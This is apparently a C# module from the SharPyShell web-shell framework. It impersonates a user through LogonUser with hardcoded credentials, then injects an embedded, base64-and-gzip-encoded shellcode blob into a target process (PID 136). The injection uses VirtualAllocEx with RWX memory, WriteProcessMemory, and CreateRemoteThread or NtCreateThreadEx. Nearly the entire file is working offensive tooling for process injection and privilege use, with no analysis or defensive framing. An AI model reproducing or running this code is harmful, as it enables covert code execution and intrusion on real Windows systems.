`
                    using System;using System.IO;using System.Diagnostics;using System.Text;
                    using System.Runtime.InteropServices; using System.IO.Compression;
                    using Microsoft.Win32.SafeHandles;using System.Runtime.ConstrainedExecution;
                    using System.Security.Principal;using System.Security.Permissions;using System.Security;

                    public class SharPyShell
                    {
                        [DllImport("kernel32.dll", SetLastError = true)]
                        static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

                        [DllImport("kernel32.dll", SetLastError = true)]
                        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

                        [DllImport("kernel32.dll", SetLastError = true)]
                        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
                        
                        [DllImport("kernel32.dll", SetLastError = true)]
                        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

                        [DllImport("kernel32.dll", SetLastError = true)]
                        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
                        
                        [DllImport("kernel32.dll", SetLastError=true)]
                        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
                        
                        [DllImport("kernel32.dll", SetLastError = true)]
                        static extern bool CloseHandle(IntPtr hObject);
                        
                        [DllImport("ntdll.dll", SetLastError = true)]
                        static extern UInt32 NtCreateThreadEx(ref IntPtr hThread,UInt32 DesiredAccess,IntPtr ObjectAttributes,IntPtr ProcessHandle,IntPtr StartAddress,IntPtr lParam,bool CreateSuspended,UInt32 StackZeroBits,UInt32 SizeOfStackCommit,UInt32 SizeOfStackReserve,IntPtr BytesBuffer);

                        const uint PAGE_ALIGN = 1024;
                        
                        const int PROCESS_CREATE_THREAD = 0x0002;
                        const int PROCESS_QUERY_INFORMATION = 0x0400;
                        const int PROCESS_VM_OPERATION = 0x0008;
                        const int PROCESS_VM_WRITE = 0x0020;
                        const int PROCESS_VM_READ = 0x0010;

                        const uint MEM_COMMIT = 0x00001000;
                        const uint MEM_RESERVE = 0x00002000;
                        const uint PAGE_READWRITE = 0x04;
                        const uint PAGE_EXECUTE_READ = 0x20;
                        const uint PAGE_EXECUTE_READWRITE = 0x40;
                        const uint WAIT_OBJECT_0 = 0x00000000;

                        
                        private const int LOGON32_PROVIDER_DEFAULT = 0;
                        private sealed class SafeTokenHandle : SafeHandleZeroOrMinusOneIsInvalid
                        {
                            private SafeTokenHandle()
                                : base(true)
                            {
                            }
                        
                            [DllImport("kernel32.dll")]
                            [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
                            [SuppressUnmanagedCodeSecurity]
                            [return: MarshalAs(UnmanagedType.Bool)]
                            private static extern bool CloseHandle(IntPtr handle);
                        
                            protected override bool ReleaseHandle()
                            {
                                return CloseHandle(handle);
                            }
                        }
                        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
                        private static extern bool LogonUser(String lpszUsername, String lpszDomain, String lpszPassword, int dwLogonType, int dwLogonProvider, out SafeTokenHandle phToken);
                        
                        [DllImport("advapi32.dll", EntryPoint="CreateProcessAsUser", SetLastError=true, CharSet=CharSet.Ansi, CallingConvention=CallingConvention.StdCall)]
                        private static extern bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment, String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
                        
                        [DllImport("advapi32.dll", EntryPoint="DuplicateTokenEx")]
                        private static extern bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpThreadAttributes, int TokenType, int ImpersonationLevel, ref IntPtr DuplicateTokenHandle);
                        
                        [StructLayout(LayoutKind.Sequential)] private struct PROCESS_INFORMATION
                        {
                            public IntPtr hProcess;
                            public IntPtr hThread;
                            public uint   dwProcessId;
                            public uint   dwThreadId;
                        }
                        
                        [StructLayout(LayoutKind.Sequential)] private struct SECURITY_ATTRIBUTES
                        {
                            public int    Length;
                            public IntPtr lpSecurityDescriptor;
                            public bool   bInheritHandle;
                        }
                        
                        [StructLayout(LayoutKind.Sequential)] private struct STARTUPINFO
                        {
                            public int cb;
                            public String lpReserved;
                            public String lpDesktop;
                            public String lpTitle;
                            public uint dwX;
                            public uint dwY;
                            public uint dwXSize;
                            public uint dwYSize;
                            public uint dwXCountChars;
                            public uint dwYCountChars;
                            public uint dwFillAttribute;
                            public uint dwFlags;
                            public short wShowWindow;
                            public short cbReserved2;
                            public IntPtr lpReserved2;
                            public IntPtr hStdInput;
                            public IntPtr hStdOutput;
                            public IntPtr hStdError;
                        }
                        
                        private const uint GENERIC_ALL = 0x10000000;
                        private const int SecurityImpersonation = 2;
                        private const int TokenType = 1;
                        
                        public string InjectShellcodeAs(byte[] byteArrayCode, byte[] threadParameters, string process, uint threadTimeout, ulong offset, string username, string password)
                        {
                            string output = "";
                            string error_string = "\n\n\t{{{SharPyShellError}}}";
                            int processId=0;
                            Process targetProcess = new Process();
                            IntPtr targetProcessHandle = IntPtr.Zero;
                            IntPtr injectedThreadHandle = IntPtr.Zero;
                            bool usingExistingProcess = false;
                            try
                            {
                                SafeTokenHandle safeTokenHandle;
                                bool returnValue = LogonUser(username, "", password, 3, LOGON32_PROVIDER_DEFAULT, out safeTokenHandle);
                                if (false == returnValue)
                                {
                                    output += error_string + "\nWrong Credentials. LogonUser failed with error code : " + Marshal.GetLastWin32Error();
                                    return output;
                                }
                                
                                using (safeTokenHandle)
                                {
                                    IntPtr runasToken = safeTokenHandle.DangerousGetHandle();
                                    using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(runasToken))
                                    {
                                        if(!Int32.TryParse(process, out processId)){
                                            IntPtr Token = new IntPtr(0);
                                            IntPtr DupedToken = new IntPtr(0);
                                            bool      ret;
                                            SECURITY_ATTRIBUTES sa  = new SECURITY_ATTRIBUTES();
                                            sa.bInheritHandle       = false;
                                            sa.Length               = Marshal.SizeOf(sa);
                                            sa.lpSecurityDescriptor = (IntPtr)0;
                                            Token = WindowsIdentity.GetCurrent().Token;
                                            
                                            ret = DuplicateTokenEx(Token, GENERIC_ALL, ref sa, SecurityImpersonation, TokenType, ref DupedToken);
                                            if (ret == false){
                                                 output += error_string + "\nDuplicateTokenEx failed with " + Marshal.GetLastWin32Error();
                                                return output;
                                            }
                                            STARTUPINFO si          = new STARTUPINFO();
                                            si.cb                   = Marshal.SizeOf(si);
                                            si.lpDesktop            = "";
                                            PROCESS_INFORMATION pi  = new PROCESS_INFORMATION();
                                            
                                            ret = CreateProcessAsUser(DupedToken,null, process, ref sa, ref sa, false, 0, (IntPtr)0, null, ref si, out pi);
                                            if (ret == false){
                                                output += error_string + "\nCreateProcessAsUser failed with " + Marshal.GetLastWin32Error();
                                                return output;
                                            }
                                            targetProcess = Process.GetProcessById((int)pi.dwProcessId);
                                            processId = targetProcess.Id;
                                            output += "\n\n\tStarted process " + process + " with pid " + processId.ToString();
                                        }
                                        else{
                                            targetProcess = Process.GetProcessById(processId);
                                            usingExistingProcess = true;
                                            output += "\n\n\tTrying to open running process with pid " + processId.ToString();
                                        }
                                        string processName = targetProcess.ProcessName;
                                        string targetProcessPid = processId.ToString();
                                        targetProcessHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, processId);
                                        if(targetProcessHandle == (IntPtr)0){
                                            output += error_string + "\n\tOpenProcess on pid " + targetProcessPid + " failed with error code " + Marshal.GetLastWin32Error();
                                            return output;
                                        }
                                        output += "\n\n\tCorreclty opened a handle on process " + processName + ".exe with pid " + targetProcessPid;
                                        
                                        uint codeMemorySize = (uint)(byteArrayCode.Length * Marshal.SizeOf(typeof(byte)) + 1);
                                        if(codeMemorySize % PAGE_ALIGN != 0)
                                            codeMemorySize += PAGE_ALIGN - ((uint)(byteArrayCode.Length+1) % PAGE_ALIGN);
                                        
                    IntPtr codeMemAddress = VirtualAllocEx(targetProcessHandle, IntPtr.Zero, codeMemorySize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    if(codeMemAddress == (IntPtr)0){
                        output += error_string + "\n\tError allocating code buffer memory.\n\tVirtualAllocEx failed with error code " + Marshal.GetLastWin32Error(); 
                        return output;
                    }
                    uint bytesWrittenCode;
                    output += "\n\n\tAllocated memory RWX for code of " + codeMemorySize.ToString() + " bytes";
                    if(!WriteProcessMemory(targetProcessHandle, codeMemAddress, byteArrayCode, codeMemorySize, out bytesWrittenCode)){
                        output += error_string + "\n\tError writing code buffer in memory.\n\tWriteProcessMemory failed with error code " + Marshal.GetLastWin32Error();
                        return output;
                    }
                    output += "\n\n\tCode written into remote process. Bytes written: " + bytesWrittenCode.ToString();
    
        
                                        codeMemAddress = (IntPtr)((ulong)codeMemAddress + (ulong)offset);
                                        if(threadParameters.Length > 0){
                                            output += "\n\n\tThread parameters detected. Starting to allocate memory RW ...";
                                            uint threadParametersSize = (uint)(threadParameters.Length * Marshal.SizeOf(typeof(byte)) + 1);
                                            IntPtr threadParametersMemAddress = VirtualAllocEx(targetProcessHandle, IntPtr.Zero, threadParametersSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                                            if(threadParametersMemAddress == (IntPtr)0){
                                                output += error_string + "\n\tError allocating thread parameters buffer memory.\n\tVirtualAllocEx failed with error code " + Marshal.GetLastWin32Error();
                                                return output;
                                            }
                                            uint bytesWrittenThreadParams;
                                            output += "\n\n\tAllocated memory RW for thread parameters of " + threadParametersSize.ToString() + " bytes";
                                            if(!WriteProcessMemory(targetProcessHandle, threadParametersMemAddress, threadParameters, threadParametersSize, out bytesWrittenThreadParams)){
                                                output += error_string + "\n\tError writing code buffer in memory.\n\tWriteProcessMemory failed with error code " + Marshal.GetLastWin32Error();
                                                return output;
                                            }
                                            output += "\n\n\tThread parameters written into remote process. Bytes written: " + bytesWrittenThreadParams.ToString();
                                            if(Environment.OSVersion.Version  < new Version(6, 2) && usingExistingProcess){
                                                output += "\n\n\tDetected windows version < 6.2 and injection across sessions. Using NtCreateThreadEx...";
                                                NtCreateThreadEx(ref injectedThreadHandle, 0x1FFFFF, IntPtr.Zero, targetProcessHandle, codeMemAddress, threadParametersMemAddress, false, 0, 0, 0, IntPtr.Zero);
                                            }
                                            else{
                                                output += "\n\n\tUsing CreateRemoteThread...";
                                                injectedThreadHandle = CreateRemoteThread(targetProcessHandle, IntPtr.Zero, 0, codeMemAddress, threadParametersMemAddress, 0, IntPtr.Zero);
                                            }
                                        }
                                        else{
                                            if(Environment.OSVersion.Version  < new Version(6, 2) && usingExistingProcess){
                                                output += "\n\n\tDetected windows version < 6.2 and injection across sessions. Using NtCreateThreadEx...";
                                                NtCreateThreadEx(ref injectedThreadHandle, 0x1FFFFF, IntPtr.Zero, targetProcessHandle, codeMemAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
                                            }
                                            else{
                                                output += "\n\n\tUsing CreateRemoteThread...";
                                                injectedThreadHandle = CreateRemoteThread(targetProcessHandle, IntPtr.Zero, 0, codeMemAddress, IntPtr.Zero, 0, IntPtr.Zero);
                                            }
                                        }
                                        if(injectedThreadHandle == (IntPtr)0){
                                            output += error_string + "\n\tError creating remote thread into target process.\n\tRemote Thread creation failed with error code " + Marshal.GetLastWin32Error();
                                            return output;
                                        }
                                        output += "\n\n\tRemote Thread started!";
                                        if(threadTimeout>0){
                                            uint wait_for = WaitForSingleObject(injectedThreadHandle, threadTimeout);
                                            if(wait_for == WAIT_OBJECT_0){
                                                output += "\n\n\tCode executed and exited correctly";
                                                try{
                                                    Process.GetProcessById(processId);
                                                    targetProcess.Kill();
                                                    output += "\n\n\tProcess " + processName + " with pid " + targetProcessPid + " has been killed";
                                                }
                                                catch{
                                                    output += "\n\n\tProcess " + processName + " with pid " + targetProcessPid + " has exited";
                                                }
                                            }
                                            else{
                                                output += "\n\n\tRemote Thread Timed Out";
                                            }
                                        }
                                        else{
                                            output += "\n\n\tCode executed left in background as an async thread in the process '" + processName + ".exe' with pid " + targetProcessPid; 
                                        }
                                    }      
                                }
                                
                                
                                
                            }
                            catch (Exception ex)
                            {
                                output += error_string + "\n\tException occurred. " + ex.Message;
                                return output;
                            }
                            finally{
                                if((int)injectedThreadHandle > 0)
                                    CloseHandle(injectedThreadHandle);
                                if((int)targetProcessHandle > 0)
                                    CloseHandle(targetProcessHandle);
                            }
                            return output + "\n\n";
                        }
                        
                        private byte[] Decompress(byte[] data)
                        {
                            using (MemoryStream compressedStream = new MemoryStream(data))
                            using (GZipStream zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
                            using (MemoryStream resultStream = new MemoryStream())
                            {
                                byte[] buffer = new byte[16*1024];
                                int read;
                                while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0)
                                {
                                    resultStream.Write(buffer, 0, read);
                                }
                                return resultStream.ToArray();
                            }
                        }

                        public byte[] ExecRuntime()
                        {
                            string shellcodeBase64 = "H4sIACYPy10C//vj0fzkw4sjDAwMjoGOAUGBYR6Gl1I9uoMSgFgCiBU8uosCPPi3e3n5Gp70MDywxiaxhklHwfHgSV5HxoOP3gY5BoJUdTvZeDBeSGuskOBmKs3rbugAGujReqAkGSga0O0h4dLtoODJeOFxkMf/k47dJh0ejNeg5kFNsnhQ+tGH2UeFw9XyYumNCKB6FaD6NMduHg8gWwbIduxmAWq74BjhGBEXGQWkIh2jHIP+PwAyojy6hV4G////P9aj+Y2Dx3EXFQOg/QxAWgNKKzADaVfDk447GIGMXUDc4NHbmwnkOO669e2W//+rHp0uKmCtCiAtPr29kSDJHRwgj/ROTQRyPLp9VBwcd62dF78bqBzCOTatPQjEaQUp2CkAUVwEUmzI5NF8iOPR99eSDGgg2SqmIr9IL5thcqAR52u5/26fNd4cfyNess/yr9pOpa+7Fk1YNOX4MRsN4TAl4VjJArVwWRXmcElxQVNmxqgwXmNNPnW7aN80G3N3bpOImDRtXRd1Jf54rjqLcLd0DaZUDR1JGQ0Z71RtBSkOaaaweDNtOR47k9hYCwVtOW2ueHFtW+YKAF6+IH71AQAA";
                            byte[] shellcodeCompressed = Convert.FromBase64String(shellcodeBase64);
                            byte[] shellcodeByteArr = Decompress(shellcodeCompressed);
                            string threadParametersBase64 = "";
                            byte[] threadParameters = {};
                            if(threadParametersBase64.Length > 0){
                                byte[] threadParametersCompressed = Convert.FromBase64String(threadParametersBase64);
                                threadParameters = Decompress(threadParametersCompressed);
                            }
                            string output_func=InjectShellcodeAs(shellcodeByteArr, threadParameters, @"136", 0, 0, "admin_infinity", "Password2!");
                            byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
                            return(output_func_byte);
                        }
                    }   
                    